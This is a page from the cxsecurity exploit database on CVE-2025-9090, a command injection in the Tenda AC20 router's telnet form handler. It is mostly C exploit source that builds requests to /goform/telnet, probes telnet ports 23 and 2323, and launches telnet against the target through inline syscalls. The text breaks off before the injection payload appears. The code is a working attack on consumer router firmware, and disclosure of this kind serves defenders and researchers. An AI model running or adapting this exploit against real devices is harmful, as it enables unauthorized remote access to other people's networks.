---
title: Tenda AC20 16.03.08.12 Command Injection
url: https://cxsecurity.com/issue/WLB-2025080017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-21
fetch_date: 2025-10-07T00:12:43.867341
---

# Tenda AC20 16.03.08.12 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenda AC20 16.03.08.12 Command Injection** **2025.08.20**  Credit:  **[Anonymous](https://cxsecurity.com/author/Anonymous/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-9090](https://cxsecurity.com/cveshow/CVE-2025-9090/ "Click to see CVE-2025-9090")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

/\*
\* Exploit Title : Tenda AC20 16.03.08.12 - Command Injection
\* Author : Byte Reaper
\* CVE : CVE-2025-9090
\* Description: A vulnerability was identified in Tenda AC20 16.03.08.12. Affected is the function websFormDefine of the file /goform/telnet of the component Telnet Service.
\* target endpoint : /goform/telnet
\* place in service : http://<IP>
\* full format target url : http://<IP>/goform/telnet
\* Exploitation plan:
\* 1. Build full URL
\* 2. Prepare POST data (Sleep + full url + libcurl function)
\* 3. Send POST request via CURL
\* 4. Measure response: HTTP code, telnet access (23), error word (not found)
\* 5. Determine success & finalize exploit
\*/
#include <stdio.h>
#include "argparse.h"
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <errno.h>
#define MAX\_RESPONSE (50 \* 1024 \* 1024)
#define URL 2400
#define BUFFER 4500
const char \*ipT = NULL;
const char \*cookies = NULL;
int loopF = 0;
int verbose = 0;
int fileCookies = 0;
void exit64bit()
{
fflush(NULL);
\_\_asm\_\_ volatile
(
"syscall\n\t"
:
: "A"(0x3C),
"D"(0)
: "rcx",
"r11",
"memory"
);
fflush(NULL);
}
struct Mem
{
char \*buffer;
size\_t len;
};
size\_t write\_cb(void \*ptr,
size\_t size,
size\_t nmemb,
void \*userdata)
{
if (!userdata)
{
return 0;
}
if (size && nmemb > SIZE\_MAX / size)
{
fprintf(stderr, "\e[0;31m[-] size \* nmemb overflow !\e[0m\n");
return 0;
}
size\_t total = size \* nmemb;
struct Mem \*m = (struct Mem \*)userdata;
if (total > MAX\_RESPONSE || (m->len + total + 1) > MAX\_RESPONSE)
{
fprintf(stderr, "\e[0;31m[-] Response too large or would exceed MAX\_RESPONSE !\e[0m\n");
return 0;
}
char \*tmp = realloc(m->buffer, m->len + total + 1);
if (tmp == NULL)
{
fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
exit64bit();
}
m->buffer = tmp;
memcpy(&(m->buffer[m->len]), ptr, total);
m->len += total;
m->buffer[m->len] = '\0';
return total;
}
int checkLen(int len, char \*buf, size\_t bufcap)
{
if (len < 0 || (size\_t)len >= bufcap)
{
printf("\e[0;31m[-] Len is Long ! \e[0m\n");
printf("\e[0;31m[-] Len %d\e[0m\n", len);
return 1;
}
else
{
printf("\e[0;34m[+] Len Is Not Long.\e[0m\n");
return 0;
}
return 0;
}
void cleanObject(CURL \*c, struct curl\_slist \*h, char \*r, size\_t l)
{
printf("\e[0;33m[+] Clean Headers...\e[0m\n");
if (h != NULL)
{
curl\_slist\_free\_all(h);
}
if (c != NULL)
{
curl\_easy\_cleanup(c);
}
printf("\e[0;33m[+] Clean CURL...\e[0m\n");
if (r != NULL)
{
free(r);
r = NULL;
l = 0;
}
printf("\e[0;33m[+] Clean response buffer and len...\e[0m\n");
printf("\e[0;31m[+] Exit ....\n");
}
int sleepSocket()
{
static int current = 2;
int timeout = current;
printf("\e[0;34m[+] Timeout Socket : %d\n", timeout);
current++;
if (current > 6)
{
current = 2;
}
return timeout;
}
int connectionTelnet(const char \*ip)
{
int ports[] =
{
23,
2323
};
int num\_ports = sizeof(ports) / sizeof(ports[0]);
for (int i = 0; i < num\_ports; i++)
{
printf("\e[0;36m[+] target PORT Connection telnet : %d\e[0m\n", ports[i]);
printf("\e[0;36m[+] Try Connection in port : %d\e[0m\n", ports[i]);
int s;
char buffer[BUFFER];
struct sockaddr\_in server;
s = socket(AF\_INET, SOCK\_STREAM, 0);
if (s < 0)
{
perror("\e[0;31m[-] Error Create Socket !\e[0m\n");
return -1;
}
server.sin\_addr.s\_addr = inet\_addr(ip);
server.sin\_family = AF\_INET;
server.sin\_port = htons(ports[i]);
struct timeval timeout;
int value3 = sleepSocket();
timeout.tv\_sec = value3;
timeout.tv\_usec = 0;
if (setsockopt(s,
SOL\_SOCKET,
SO\_RCVTIMEO,
(const char\*)&timeout,
sizeof(timeout)) < 0)
{
perror("\e[0;31m[-] setsockopt() Failed !\e[0m\n");
exit64bit();
}
printf("\e[0;33m[+] Timeout Connection socket ...\e[0m\n");
if (connect(s,
(struct sockaddr \*)&server,
sizeof(server)) < 0)
{
perror("\e[0;31m[-] Connect failed in Target Ip.\e[0m\n");
close(s);
continue;
}
printf("[+] Connection Success in server.\e[0m\n");
char banner[256];
int n = recv(s,
banner,
sizeof(banner)-1,
0);
if (n > 0)
{
banner[n] = '\0';
printf("\e[0;36m[+] Telnet Banner: %s\e[0m\n", banner);
}
close(s);
if (verbose)
{
printf("\e[0;33m[+] Close Socket...\e[0m\n");
}
return ports[i];
}
return -1;
}
int systemCommand(const char \*ip)
{
pid\_t pid;
printf("\e[0;37m[+] Before fork (PID : %d)\e[0m\n", getpid());
pid = fork();
if (pid < 0)
{
fprintf(stderr, "\e[0;31m[-] Fork failed !\e[0m\n");
return 1;
}
else if (pid == 0)
{
int access[] = {23, 2323, 80};
int numberAccess = sizeof(access) / sizeof(access[0]);
for (int a = 0; a < numberAccess ; a++)
{
printf("\e[0;34m[+] child process (pid : %d)\e[0m\n", getpid());
printf("\e[0;34m[+] sys\_execve syscall...\e[0m\n");
char ipS[90];
int lenIp = snprintf(ipS, sizeof(ipS), "%s", ip);
if (checkLen(lenIp,ipS,sizeof(ipS)) == 1)
{
printf("\e[0;31m[-] Len Content (Target IP) is Long !\e[0m\n");
printf("\e[0;31m[-] Result Len (ip) : %d\e[0m\n",
lenIp);
exit64bit();
}
char portsA[40];
int lenA = snprintf(portsA, sizeof(portsA), "%d", access[a]);
if (checkLen(lenA,portsA,sizeof(portsA)) == 1)
{
printf("\e[0;31m[-] Len Content (Target port) is Long !\e[0m\n");
printf("\e[0;31m[-] Result Len (port) : %d\e[0m\n",
lenA);
exit64bit();
}
const char \*c = "/usr/bin/telnet";
char \*const argv[] =
{
"telnet",
ipS,
portsA,
NULL
};
const char \*envp[] = {NULL};
\_\_asm\_\_ volatile
(
"mov $59, %%rax\n\t"
"mov %[command], %%rdi\n\t"
"mov %[v], %%rsi\n\t"
"mov %[e], %%rdx\n\t"
"syscall\n\t"
:
: [command] "r"(c),
[v] "r"(argv),
[e] "r" (envp)
:"rax",
"rdi",
"rsi" ,
"rdx"
);
\_\_asm\_\_ volatile
(
"mov $0x3C, %%rax\n\t"
"xor %%rdi, %%rdi\n\t"
"syscall\n\t"
:
:
:"rax",
"rdi"
);
}
}
else
{
waitpid(pid,
NULL,
0);
printf("\e[0;36m[+] Child p...